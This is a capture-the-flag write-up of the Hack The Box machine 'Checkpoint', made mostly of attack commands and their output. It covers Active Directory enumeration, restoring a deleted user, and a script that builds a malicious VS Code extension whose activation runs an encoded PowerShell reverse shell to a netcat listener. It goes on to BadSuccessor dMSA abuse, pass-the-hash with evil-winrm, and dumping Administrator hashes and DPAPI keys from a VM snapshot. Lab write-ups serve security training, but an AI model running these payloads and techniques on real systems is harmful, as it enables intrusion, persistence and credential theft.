# Checkpoint

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

```bash
ip=10.129.12.8

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/connected_tcp.htb $ip



# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/connected_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/connected_udp.htb $ip
# 123
```

<mark style="color:blue;">**Step 2**</mark>

**After taking 1 day for deep enumration and trying multipe technics i found that i need to update bloodyad to have more details (LOL)**

{% code overflow="wrap" %}
```bash
bloodyAD --host 10.129.13.33 -d checkpoint.htb -u $user -p $pass get writable 
# distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
# permission: WRITE

bloodyAD --host $dc -d $domain -u $user -p $pass set restore mark.davies
# [+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb

fake_dc $dc nxc smb $ip -u mark.davies -p $pass
# SMB         10.129.13.33    445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
```
{% endcode %}

<mark style="color:blue;">**Step 3**</mark>&#x20;

**Mark user has write permissions over a share**

{% code overflow="wrap" %}
```bash
fake_dc $dc nxc smb $ip -u $user -p $pass --shares
 # DevDrop         READ,WRITE             VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
```
{% endcode %}

**so the main idea that i start with every time i see write on a share is to put a malicious file that get executed after searching we need to create a malicious .vsix extensions put into a rev shell**&#x20;

{% code overflow="wrap" %}
```bash
#!/bin/bash
# gen_malicious_ext.sh - Generates evil VS Code: extension for DevDrop
# Usage: ./gen_malicious_ext.sh

mkdir -p malicious-ext/out && cd malicious-ext

cat > package.json << 'EOF'
{
  "name": "malicious-ext",
  "displayName": "Malicious Extension",
  "description": "System extension",
  "version": "1.0.0",
  "publisher": "checkpoint",
  "engines": {
    "vscode": "^1.118.0"
  },
  "categories": ["Other"],
  "activationEvents": ["*"],
  "main": "./out/extension.js",
  "contributes": {}
}
EOF

cat > out/extension.js << 'EOF'
const vscode = require('vscode');
const { exec } = require('child_process');

function activate(context) {
    exec('powershell -e <BASE64>', (error, stdout, stderr) => {
        console.log(stdout);
    });
}      

function deactivate() {}

module.exports = { activate, deactivate };
EOF

# Install vsce if not present
if ! command -v vsce &> /dev/null; then
    echo "[+] Installing vsce..."
    npm install -g @vscode/vsce
fi

# Package it
echo "[+] Packaging extension..."
vsce package

echo "[+] Done! Upload with:"
echo "    smbclient //TARGET_IP/DevDrop -U 'DOMAIN\\User' -p 'PASSWORD' -c 'put malicious-ext-1.0.0.vsix'"
echo ""
echo "[+] Start listener: nc -lvnp 9001"

```
{% endcode %}

{% code overflow="wrap" %}
```bash
listener 9001
# connect to [10.10.14.63] from (UNKNOWN) [10.129.13.33] 64710

PS C:\Program Files\Microsoft VS Code>  whoami
checkpoint\ryan.brooks
```
{% endcode %}

<mark style="color:blue;">**Step 4**</mark>

**We abuse the DMSA group using Badsuccessor we earlier talk about this in eighteen htb machine**

```bash
fake_dc $dc bloodyAD -d 'checkpoint.htb' -u 'ryan.brooks' -k --host 'DC01.checkpoint.htb' --dc-ip $ip add badSuccessor bad_DMSA -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'

fake_dc $dc evil-winrm -i 10.129.13.81 -u svc_deploy -H 'e16081eb077aca74bdbf8af12af43ac9'
```

<mark style="color:blue;">**Step 5**</mark>

<figure><img src=".gitbook/assets/Capture d&#x27;écran 2026-06-15 043322.png" alt=""><figcaption></figcaption></figure>

**Our user is in backupacees so the idea is to dump the ntds so we need to enumarate**

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path C:\ -Recurse -Include "*.vhdx","*.vhd","*.vmdk","*.vbk" -ErrorAction SilentlyContinue
#    Directory: C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics


# Mode                 LastWriteTime         Length Name
# ----                 -------------         ------ ----
# -a----          5/9/2026   7:45 PM      106496000 Windows Server 2019-000001.vmdk
# -a----          5/9/2026   7:39 PM    10199695360 Windows Server 2019.vmdk
```
{% endcode %}

<mark style="color:blue;">**Step 6**</mark>

{% code overflow="wrap" %}
```powershell
.\vmkatz.exe "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmsn"

  Username: Administrator
    NT Hash : f29e9c014295b9b32139b09a2790be3b
    SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
    DPAPI   : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
  [DPAPI]
    GUID          : c53f7d5b-2902-415c-9c09-251f39974440
    MasterKey     : 32cc5c309067ca0994b849897a9b85b89511547030a1d8b74fe6e37ba037a4161301ffce692e6e433c3821dc18abfe208e1dc5c458de79d1352c6681e18bde15
    SHA1 MasterKey: b061f87be6d2776897d912fed9156a354b81a595

```
{% endcode %}

